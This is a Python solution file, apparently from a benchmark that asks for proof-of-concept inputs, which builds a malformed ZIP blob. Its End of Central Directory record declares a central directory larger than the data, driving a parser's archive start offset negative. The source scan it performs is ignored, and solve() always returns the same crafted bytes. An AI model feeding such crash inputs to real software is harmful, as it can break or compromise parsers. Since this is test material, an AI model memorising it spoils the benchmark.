import os
import re
import struct
import tarfile
from typing import Optional


class Solution:
    def _looks_like_zip_project(self, src_path: str) -> bool:
        patterns = [
            b"archive_start_offset",
            b"archive start offset",
            b"central directory",
            b"End of Central Directory",
            b"end of central directory",
            b"0x06054b50",
            b"06054b50",
            b"PK\x05\x06",
        ]

        def scan_bytes(data: bytes) -> bool:
            dl = data.lower()
            for p in patterns:
                if p.lower() in dl:
                    return True
            return False

        try:
            if os.path.isdir(src_path):
                for root, _, files in os.walk(src_path):
                    for fn in files:
                        if not fn.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".inl", ".inc", ".py", ".java", ".rs", ".go", ".md", ".txt")):
                            continue
                        p = os.path.join(root, fn)
                        try:
                            with open(p, "rb") as f:
                                data = f.read(256 * 1024)
                            if scan_bytes(data):
                                return True
                        except Exception:
                            continue
                return False

            with tarfile.open(src_path, "r:*") as tf:
                for m in tf:
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not name.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".inl", ".inc", ".py", ".java", ".rs", ".go", ".md", ".txt")):
                        continue
                    if m.size <= 0:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(min(m.size, 256 * 1024))
                        if scan_bytes(data):
                            return True
                    except Exception:
                        continue
        except Exception:
            return False

        return False

    def _zip_negative_archive_start_offset_poc(self) -> bytes:
        prefix_len = 24
        prefix = b"\x00" * prefix_len

        sig = 0x06054B50
        disk_no = 0
        cd_disk = 0
        cd_records_disk = 1
        cd_records_total = 1

        cd_size = 46
        cd_offset = 0
        comment_len = 0

        eocd = struct.pack(
            "<IHHHHIIH",
            sig,
            disk_no,
            cd_disk,
            cd_records_disk,
            cd_records_total,
            cd_size,
            cd_offset,
            comment_len,
        )
        return prefix + eocd

    def solve(self, src_path: str) -> bytes:
        _ = src_path
        # Heuristic check (best-effort). Regardless, return the crafted PoC.
        # This PoC is a minimal ZIP-like blob with an EOCD whose central directory
        # size makes the computed archive start offset negative.
        return self._zip_negative_archive_start_offset_poc()